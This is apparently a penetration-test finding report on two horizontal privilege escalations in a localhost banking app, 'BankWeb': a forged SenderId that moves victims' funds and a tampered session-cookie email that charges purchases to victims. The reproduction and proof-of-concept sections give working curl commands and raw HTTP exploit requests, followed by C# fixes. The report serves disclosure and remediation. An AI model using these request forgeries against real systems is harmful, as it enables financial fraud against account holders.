# Issue #19 — Multiple Horizontal Privilege Escalations

| Field         | Details                                               |
|---------------|-------------------------------------------------------|
| **Target**    | BankWeb — `http://localhost:1337`                     |
| **Severity**  | Critical                                              |
| **CVSS v3.1** | 8.1                                                   |
| **Vector**    | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N                  |
| **Category**  | Broken Access Control — Horizontal Privilege Escalation  |

---

## Summary

Two endpoints allow an authenticated user to perform write operations — financial transactions and store purchases — on behalf of arbitrary other users. Unlike the read-only IDOR vulnerabilities in Issue #18, these findings involve **unauthorised financial actions**: an attacker can drain money from a victim's account by forging a transaction in their name, and can make purchases charged to a victim's account by manipulating the session cookie identity.

Both vectors were confirmed end-to-end, with the resulting financial changes verified in the affected accounts.

Two vectors were identified:

- **Vector A** — the `SenderId` field in the transaction creation form is accepted from client input without being verified against the authenticated session, allowing any user to initiate a funds transfer from any other account to their own
- **Vector B** — the `BuyProduct` API derives the purchasing user's identity from the manipulable email segment of the session cookie (established in Issue #18), allowing purchases to be charged to any user's account

---

## Steps to Reproduce

### Vector A — Fraudulent Transaction (`/Transaction/Create`)

1. Log in as any standard user and navigate to **Create Transaction**.
2. Intercept the form submission using a proxy and modify the `SenderId` field to a different user's email address, setting `ReceiverId` to your own account:

   ```bash
   curl -s -X POST "http://localhost:1337/Transaction/Create" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "Cookie: SessionId=[REDACTED]" \
     -d "SenderId=[REDACTED-VICTIM]&ReceiverId=[REDACTED-OWN]&TransactionDateTime=2025-07-08&Reason=test&Reference=&Amount=100&__RequestVerificationToken=[REDACTED]"
   ```

3. Observe that the server responds with `HTTP 302` redirecting to `/Transaction`, confirming the transaction was accepted.
4. Verify the victim's balance has decreased and the attacker's balance has increased accordingly.

### Vector B — Fraudulent Purchase (`/api/Store/BuyProduct`)

1. Log in as any standard user and capture your `SessionId` cookie.
2. Decode the cookie and replace the base64-encoded email segment with a different user's email (see Issue #18 for the cookie structure):

   ```
   Original:  <base64([REDACTED-OWN])>&<hmac>&0
   Modified:  <base64([REDACTED-VICTIM])>&<hmac>&0
   ```

3. Send a `POST` request to `/api/Store/BuyProduct` with the forged cookie:

   ```bash
   curl -s -X POST "http://localhost:1337/api/Store/BuyProduct" \
     -H "Content-Type: application/json" \
     -H "Cookie: SessionId=[REDACTED-FORGED]" \
     -d '{"id":1,"quantity":1,"price":139}'
   ```

4. Observe that the server responds with `HTTP 200` and `{}`, confirming the purchase was processed.
5. Verify the purchase appears in the victim's store history (exploitable via Issue #18, Vector D).

---

## Proof of Concept

### Vector A — Transaction Forgery

**Request (attacker logged in as `[REDACTED-OWN]`, spoofing `SenderId` as `[REDACTED-VICTIM]`):**

```http
POST /Transaction/Create HTTP/1.1
Host: localhost:1337
Content-Type: application/x-www-form-urlencoded
Content-Length: 300
Origin: http://localhost:1337
Referer: http://localhost:1337/Transaction/Create
Cookie: SessionId=[REDACTED]; .AspNetCore.Antiforgery.9TtSrW0hzOs=[REDACTED]

SenderId=[REDACTED-VICTIM]&ReceiverId=[REDACTED-OWN]&TransactionDateTime=2025-07-08&Reason=test&Reference=&Amount=100&__RequestVerificationToken=[REDACTED]
```

**Response:**

```http
HTTP/1.1 302 Found
Content-Length: 0
Date: Tue, 08 Jul 2025 08:47:53 GMT
Server: Kestrel
Location: /Transaction
```

The server accepted the transaction without verifying that the `SenderId` matches the authenticated session. The funds were transferred from the victim's account to the attacker's account. Both account balances were confirmed to reflect the transfer after the request completed.

> **Note:** The antiforgery token is present and valid in this request — this is not a CSRF attack. The attacker is authenticated and is abusing the absence of a server-side sender ownership check, not bypassing CSRF protection.

---

### Vector B — Purchase Forgery via Cookie Manipulation

**Legitimate purchase request (own account):**

```http
POST /api/Store/BuyProduct HTTP/1.1
Host: localhost:1337
Content-Type: application/json
Content-Length: 33
Cookie: SessionId=[REDACTED-OWN-SESSION]

{"id":1,"quantity":1,"price":139}
```

```http
HTTP/1.1 200 OK
{}
```

**Forged purchase request (victim's account, cookie email segment replaced):**

```http
POST /api/Store/BuyProduct HTTP/1.1
Host: localhost:1337
Content-Type: application/json
Content-Length: 33
Cookie: SessionId=[REDACTED-FORGED-SESSION]

{"id":1,"quantity":1,"price":139}
```

```http
HTTP/1.1 200 OK
{}
```

Both requests return identical success responses. The purchase in the second request was confirmed to appear in the victim's store order history, charged to their account, despite the attacker's HMAC segment being used. This independently reconfirms the cookie integrity failure documented in Issue #18.

---

## Impact

- **Unauthorised fund transfers** — Vector A allows an authenticated attacker to initiate a transaction from any user's account to their own, effectively stealing funds. In a production banking context this constitutes financial fraud. The only information required is the victim's email address, which is trivially obtainable via Issue #15 (user enumeration).
- **Unauthorised purchases** — Vector B allows an attacker to charge store purchases to any victim's account, depleting their balance without their knowledge or consent.
- **No write-access barrier on financial operations** — the application validates CSRF tokens on the transaction form (the antiforgery token is present), yet fails to validate the most critical aspect: that the sender is the authenticated user. This suggests the developer understood CSRF as a threat model but did not consider authenticated abuse scenarios.
- **Cookie integrity failure compounds both vectors** — Vector B exploits the same session cookie design flaw identified in Issue #18. A single architectural fix to the session token would simultaneously remediate Vector B here and all four IDOR vectors from the previous finding.
- **Full financial compromise chain** — combined with Issue #15 (enumerate all users), Issue #18 (read all balances), and this finding (drain any account), an attacker can identify the highest-value accounts and systematically transfer their funds with only a standard user session.

---

## Recommended Mitigations

1. **Ignore the `SenderId` field entirely and derive it from the authenticated session.** The sender of a transaction must always be the currently logged-in user — this should never be a client-supplied value:

   ```csharp
   [HttpPost("Create")]
   [Authorize]
   public async Task<IActionResult> Create(TransactionRequest request)
   {
       // Override whatever the client sent — sender is always the session owner
       request.SenderId = User.Identity.Name;
       await _transactionService.CreateAsync(request);
       return Redirect("/Transaction");
   }
   ```

2. **Derive the purchasing user's identity from the validated session** in `BuyProduct`, never from the cookie's email segment directly:

   ```csharp
   [HttpPost("BuyProduct")]
   [Authorize]
   public async Task<IActionResult> BuyProduct([FromBody] PurchaseRequest request)
   {
       var username = User.Identity.Name;
       await _storeService.PurchaseAsync(username, request.Id, request.Quantity, request.Price);
       return Ok();
   }
   ```

3. **Replace the custom session cookie with an opaque, server-side session token** (see Issue #18 for full implementation details). As long as the cookie embeds a manipulable, unauthenticated identity claim, any endpoint that trusts it for write operations will remain exploitable.

4. **Validate the `price` field server-side** on `BuyProduct`. The request body includes a client-supplied `price` value — if the server uses this rather than the authoritative price from the database, a separate price manipulation vulnerability exists that should be investigated and remediated.

5. **Implement transaction signing or confirmation** for high-value operations. Sensitive financial actions — particularly outbound fund transfers — should require additional verification (e.g. re-authentication, a one-time PIN, or an explicit confirmation step) that cannot be bypassed by request manipulation alone.